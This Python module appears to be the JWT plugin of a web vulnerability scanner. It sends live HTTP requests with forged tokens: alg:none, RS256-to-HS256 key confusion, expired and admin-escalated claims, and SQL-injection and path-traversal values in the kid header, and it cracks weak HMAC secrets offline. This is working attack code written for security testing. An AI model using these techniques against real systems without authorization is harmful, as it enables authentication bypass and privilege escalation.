"""JWT 취약점 공격 시나리오 실행기 - 실제 HTTP 요청을 통해 공격을 검증합니다."""
import json
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse

from s2n.s2nscanner.plugins.jwt.jwt_analyzer import JWTAnalyzer, JWTToken
from s2n.s2nscanner.plugins.jwt.jwt_constants import (
    DEFAULT_TIMEOUT,
    JWKS_ENDPOINTS,
    KID_ATTACKER_SECRET,
    KID_NULL_SECRET,
    KID_PATH_PAYLOADS,
    KID_SQL_PAYLOADS,
    PRIVILEGE_ESCALATION_VALUES,
    SQL_ERROR_PATTERNS,
)
from s2n.s2nscanner.logger import get_logger

logger = get_logger("plugins.jwt.attacker")


# =============================================================================
# 공격 결과 데이터 클래스
# =============================================================================

@dataclass
class AttackResult:
    """단일 공격 시나리오 실행 결과"""
    attack_id: str        # "JWT-01", "JWT-02", ...
    success: bool
    token_used: str       # 사용된 토큰 (일부 마스킹 가능)
    url: str
    method: str
    status_code: int
    response_body: str
    evidence: str
    extra: Dict[str, Any] = field(default_factory=dict)


# =============================================================================
# JWTAttacker
# =============================================================================

class JWTAttacker:
    """각 JWT 공격 시나리오를 실제 HTTP 요청으로 실행합니다."""

    def __init__(self, http_client: Any, target_urls: List[str], log: Any = None):
        self.http_client = http_client
        self.target_urls = target_urls
        self.log = log or logger
        self.analyzer = JWTAnalyzer()

    # ------------------------------------------------------------------
    # 내부 HTTP 유틸리티
    # ------------------------------------------------------------------

    def _send_with_token(
        self, url: str, token: str, method: str = "GET"
    ) -> Tuple[int, str]:
        """지정된 Bearer 토큰으로 URL에 HTTP 요청을 보냅니다."""
        headers = {"Authorization": f"Bearer {token}"}
        try:
            if method.upper() == "GET":
                resp = self.http_client.get(url, headers=headers, timeout=DEFAULT_TIMEOUT)
            else:
                resp = self.http_client.request(
                    method, url, headers=headers, timeout=DEFAULT_TIMEOUT
                )
            return resp.status_code, getattr(resp, "text", "")
        except Exception as exc:
            self.log.debug(f"[JWTAttacker] 요청 실패 url={url}: {exc}")
            return -1, ""

    def _send_no_auth(self, url: str) -> Tuple[int, str]:
        """Authorization 헤더 없이 (빈 값으로) URL에 GET 요청합니다."""
        try:
            resp = self.http_client.get(
                url, headers={"Authorization": ""}, timeout=DEFAULT_TIMEOUT
            )
            return resp.status_code, getattr(resp, "text", "")
        except Exception as exc:
            self.log.debug(f"[JWTAttacker] 인증 없는 요청 실패 url={url}: {exc}")
            return -1, ""

    def _is_authenticated(self, status_code: int) -> bool:
        """응답 상태 코드가 인증 성공을 의미하는지 판단합니다."""
        return status_code != -1 and status_code not in (401, 403)

    def _is_unauthenticated(self, status_code: int) -> bool:
        """응답이 인증 실패(401/403)인지 확인합니다."""
        return status_code in (401, 403)

    def _get_primary_url(self) -> Optional[str]:
        """공격에 사용할 대표 URL을 반환합니다."""
        return self.target_urls[0] if self.target_urls else None

    # ------------------------------------------------------------------
    # JWT-01: Algorithm None 공격
    # ------------------------------------------------------------------

    def attack_none_alg(self, token: JWTToken) -> List[AttackResult]:
        """JWT-01: alg:none 변형 토큰으로 서명 검증 우회를 시도합니다."""
        results: List[AttackResult] = []
        url = self._get_primary_url()
        if not url:
            return results

        # 베이스라인: 인증 없이 접근 시 401/403 이어야 의미 있음
        no_auth_code, _ = self._send_no_auth(url)
        if not self._is_unauthenticated(no_auth_code):
            self.log.debug(
                f"[JWT-01] {url} 은 인증 없이도 접근 가능 (status={no_auth_code}), 스킵"
            )
            return results

        none_tokens = self.analyzer.build_none_alg_tokens(token)
        for none_token in none_tokens:
            # alg 변형 추출 (헤더 파트에서)
            try:
                import base64
                import json as _json
                header_part = none_token.split(".")[0]
                pad = (4 - len(header_part) % 4) % 4
                alg_variant = _json.loads(
                    base64.urlsafe_b64decode(header_part + "=" * pad)
                ).get("alg", "none")
            except Exception:
                alg_variant = "none"

            status, body = self._send_with_token(url, none_token)
            if self._is_authenticated(status) and not self._is_unauthenticated(status):
                preview = none_token if len(none_token) <= 80 else none_token[:77] + "..."
                results.append(AttackResult(
                    attack_id="JWT-01",
                    success=True,
                    token_used=preview,
                    url=url,
                    method="GET",
                    status_code=status,
                    response_body=body[:500],
                    evidence=(
                        f"HTTP {status} 응답 수신 - alg:\"{alg_variant}\" 변형 토큰으로 "
                        f"인증 성공. (베이스라인 미인증 상태코드: {no_auth_code})"
                    ),
                    extra={"alg_variant": alg_variant},
                ))
                break  # 한 변형이 성공하면 충분

        return results

    # ------------------------------------------------------------------
    # JWT-02: 약한 HS256 시크릿 크래킹 (오프라인)
    # ------------------------------------------------------------------

    def attack_weak_secret(
        self, token: JWTToken, secrets: List[str]
    ) -> Optional[str]:
        """JWT-02: 사전 공격으로 HS* 시크릿 키를 복원합니다 (오프라인).

        Returns:
            크래킹 성공 시 시크릿 문자열, 실패 시 None
        """
        return self.analyzer.crack_hs256_secret(token, secrets)

    # ------------------------------------------------------------------
    # JWT-03: RS256 → HS256 알고리즘 다운그레이드
    # ------------------------------------------------------------------

    def attack_rs256_downgrade(
        self, token: JWTToken, public_key_pem: str
    ) -> List[AttackResult]:
        """JWT-03: RSA 공개키를 HMAC 시크릿으로 사용한 HS256 토큰으로 인증을 시도합니다."""
        results: List[AttackResult] = []
        url = self._get_primary_url()
        if not url:
            return results

        no_auth_code, _ = self._send_no_auth(url)
        if not self._is_unauthenticated(no_auth_code):
            return results

        downgrade_token = self.analyzer.build_hs256_downgrade_token(token, public_key_pem)
        if not downgrade_token:
            return results

        status, body = self._send_with_token(url, downgrade_token)
        if self._is_authenticated(status) and not self._is_unauthenticated(status):
            preview = downgrade_token if len(downgrade_token) <= 80 else downgrade_token[:77] + "..."
            results.append(AttackResult(
                attack_id="JWT-03",
                success=True,
                token_used=preview,
                url=url,
                method="GET",
                status_code=status,
                response_body=body[:500],
                evidence=(
                    f"HTTP {status} 응답 수신 - RS256→HS256 다운그레이드 토큰으로 인증 성공. "
                    f"(RSA 공개키를 HMAC 시크릿으로 사용)"
                ),
            ))

        return results

    # ------------------------------------------------------------------
    # JWT-04: 만료(exp) 클레임 미검증
    # ------------------------------------------------------------------

    def attack_expired_token(
        self,
        token: JWTToken,
        secret: Optional[str] = None,
        use_none_alg: bool = False,
    ) -> List[AttackResult]:
        """JWT-04: exp를 과거 시각으로 설정한 토큰으로 만료 검증 우회를 시도합니다."""
        results: List[AttackResult] = []
        if "exp" not in token.payload:
            return results  # exp 클레임이 없으면 테스트 의미 없음

        url = self._get_primary_url()
        if not url:
            return results

        # 2020-01-01 00:00:00 UTC (과거)
        past_exp = 1577836800
        payload_changes = {"exp": past_exp}

        if use_none_alg:
            expired_token: Optional[str] = self.analyzer.build_tampered_none_token(
                token, payload_changes
            )
        elif secret:
            expired_token = self.analyzer.build_tampered_hs_token(
                token, secret, payload_changes
            )
        else:
            return results

        if not expired_token:
            return results

        status, body = self._send_with_token(url, expired_token)
        if self._is_authenticated(status) and not self._is_unauthenticated(status):
            preview = expired_token if len(expired_token) <= 80 else expired_token[:77] + "..."
            results.append(AttackResult(
                attack_id="JWT-04",
                success=True,
                token_used=preview,
                url=url,
                method="GET",
                status_code=status,
                response_body=body[:500],
                evidence=(
                    f"HTTP {status} 응답 수신 - exp를 2020-01-01(과거)로 설정한 "
                    f"만료 토큰으로 인증 성공. 서버가 exp 클레임을 검증하지 않습니다."
                ),
            ))

        return results

    # ------------------------------------------------------------------
    # JWT-05: 페이로드 클레임 조작 (권한 상승)
    # ------------------------------------------------------------------

    def attack_privilege_escalation(
        self,
        token: JWTToken,
        secret: Optional[str] = None,
        use_none_alg: bool = False,
    ) -> List[AttackResult]:
        """JWT-05: 권한 관련 클레임을 admin으로 조작하여 권한 상승을 시도합니다."""
        results: List[AttackResult] = []
        url = self._get_primary_url()
        if not url:
            return results

        priv_claims = self.analyzer.find_privilege_claims(token)
        if not priv_claims:
            return results

        # 권한 상승 변경사항 구성
        escalation_changes: Dict[str, Any] = {}
        for key in priv_claims:
            key_lower = key.lower()
            if key_lower in PRIVILEGE_ESCALATION_VALUES:
                escalation_changes[key] = PRIVILEGE_ESCALATION_VALUES[key_lower]
            elif "admin" in key_lower:
                escalation_changes[key] = True
            elif "role" in key_lower:
                escalation_changes[key] = "admin"
            elif "scope" in key_lower:
                escalation_changes[key] = "admin read write delete"

        if not escalation_changes:
            return results

        if use_none_alg:
            escalated_token: Optional[str] = self.analyzer.build_tampered_none_token(
                token, escalation_changes
            )
        elif secret:
            escalated_token = self.analyzer.build_tampered_hs_token(
                token, secret, escalation_changes
            )
        else:
            return results

        if not escalated_token:
            return results

        status, body = self._send_with_token(url, escalated_token)
        if self._is_authenticated(status) and not self._is_unauthenticated(status):
            preview = escalated_token if len(escalated_token) <= 80 else escalated_token[:77] + "..."
            results.append(AttackResult(
                attack_id="JWT-05",
                success=True,
                token_used=preview,
                url=url,
                method="GET",
                status_code=status,
                response_body=body[:500],
                evidence=(
                    f"HTTP {status} 응답 수신 - 권한 클레임 조작 토큰으로 응답 수신. "
                    f"변경된 클레임: {escalation_changes}"
                ),
                extra={
                    "original_claims": priv_claims,
                    "escalated_claims": escalation_changes,
                },
            ))

        return results

    # ------------------------------------------------------------------
    # JWT-07: kid(Key ID) 헤더 인젝션
    # ------------------------------------------------------------------

    def attack_kid_injection(self, token: JWTToken) -> List[AttackResult]:
        """JWT-07: kid 헤더에 SQL Injection / Path Traversal 페이로드를 삽입합니다."""
        results: List[AttackResult] = []
        if "kid" not in token.header:
            return results

        url = self._get_primary_url()
        if not url:
            return results

        # --- SQL Injection ---
        for sql_payload in KID_SQL_PAYLOADS:
            new_header = dict(token.header)
            new_header["kid"] = sql_payload
            injected_token = self.analyzer.sign_hs_token(
                new_header, token.payload, KID_ATTACKER_SECRET
            )
            if not injected_token:
                continue

            status, body = self._send_with_token(url, injected_token)
            body_lower = body.lower()

            # SQL 에러 패턴 탐지
            sql_error = next(
                (p for p in SQL_ERROR_PATTERNS if p.lower() in body_lower), None
            )
            if sql_error:
                preview = injected_token if len(injected_token) <= 80 else injected_token[:77] + "..."
                results.append(AttackResult(
                    attack_id="JWT-07",
                    success=True,
                    token_used=preview,
                    url=url,
                    method="GET",
                    status_code=status,
                    response_body=body[:500],
                    evidence=f"SQL 에러 패턴 '{sql_error}' 탐지 (kid SQL Injection)",
                    extra={"kid_payload": sql_payload, "injection_type": "sql_error"},
                ))
                break

            # 인증 성공 탐지 (UNION SELECT로 인한 임의 키 주입)
            if self._is_authenticated(status) and not self._is_unauthenticated(status):
                preview = injected_token if len(injected_token) <= 80 else injected_token[:77] + "..."
                results.append(AttackResult(
                    attack_id="JWT-07",
                    success=True,
                    token_used=preview,
                    url=url,
                    method="GET",
                    status_code=status,
                    response_body=body[:500],
                    evidence=(
                        f"HTTP {status} - kid SQL Injection으로 인증 성공 "
                        f"(UNION SELECT 'attacker_secret')"
                    ),
                    extra={"kid_payload": sql_payload, "injection_type": "sql_auth_bypass"},
                ))
                break

        if results:
            return results  # SQL 성공 시 Path Traversal 스킵

        # --- Path Traversal ---
        for path_payload in KID_PATH_PAYLOADS:
            new_header = dict(token.header)
            new_header["kid"] = path_payload
            # /dev/null → 빈 파일 → 빈 시크릿
            injected_token = self.analyzer.sign_hs_token(
                new_header, token.payload, KID_NULL_SECRET
            )
            if not injected_token:
                continue

            status, body = self._send_with_token(url, injected_token)
            if self._is_authenticated(status) and not self._is_unauthenticated(status):
                preview = injected_token if len(injected_token) <= 80 else injected_token[:77] + "..."
                results.append(AttackResult(
                    attack_id="JWT-07",
                    success=True,
                    token_used=preview,
                    url=url,
                    method="GET",
                    status_code=status,
                    response_body=body[:500],
                    evidence=(
                        f"HTTP {status} - kid Path Traversal로 인증 성공 "
                        f"(kid={path_payload}, 빈 파일을 키로 사용)"
                    ),
                    extra={"kid_payload": path_payload, "injection_type": "path_traversal"},
                ))
                break

        return results

    # ------------------------------------------------------------------
    # JWKS 공개키 수집 (JWT-03 지원)
    # ------------------------------------------------------------------

    def fetch_jwks(self, base_url: str) -> Optional[str]:
        """
        JWKS 엔드포인트에서 RSA 공개키를 PEM 형식으로 수집합니다.

        Returns:
            PEM 형식의 공개키 문자열, 수집 실패 시 None
        """
        parsed = urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for endpoint in JWKS_ENDPOINTS:
            url = urljoin(base, endpoint)
            try:
                resp = self.http_client.get(url, timeout=DEFAULT_TIMEOUT)
                if resp.status_code != 200:
                    continue

                data = json.loads(resp.text)

                # OpenID Configuration → jwks_uri 추출 후 재요청
                jwks_uri = data.get("jwks_uri")
                if jwks_uri:
                    try:
                        resp2 = self.http_client.get(jwks_uri, timeout=DEFAULT_TIMEOUT)
                        if resp2.status_code == 200:
                            data = json.loads(resp2.text)
                    except Exception:
                        pass

                # JWKS 키 목록 파싱
                keys = data.get("keys", [])
                for jwk in keys:
                    if jwk.get("kty") == "RSA":
                        pem = _jwk_rsa_to_pem(jwk)
                        if pem:
                            self.log.info(
                                f"[JWTAttacker] RSA 공개키 수집 성공: {url}"
                            )
                            return pem

            except Exception as exc:
                self.log.debug(f"[JWTAttacker] JWKS 요청 실패 {url}: {exc}")
                continue

        return None


# =============================================================================
# JWK RSA → PEM 변환 헬퍼
# =============================================================================

def _jwk_rsa_to_pem(jwk: Dict) -> Optional[str]:
    """JWK RSA 키 딕셔너리를 PEM 형식의 공개키 문자열로 변환합니다."""
    try:
        from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives import serialization
        import base64 as _b64

        def _decode_int(b64url: str) -> int:
            padded = b64url + "=" * ((4 - len(b64url) % 4) % 4)
            return int.from_bytes(_b64.urlsafe_b64decode(padded), "big")

        n = _decode_int(jwk["n"])
        e = _decode_int(jwk["e"])
        pub_key = RSAPublicNumbers(e, n).public_key(default_backend())
        pem = pub_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        )
        return pem.decode("utf-8")
    except ImportError:
        logger.debug("[JWTAttacker] cryptography 라이브러리 없음 - JWK→PEM 변환 불가")
        return None
    except Exception as exc:
        logger.debug(f"[JWTAttacker] JWK→PEM 변환 실패: {exc}")
        return None
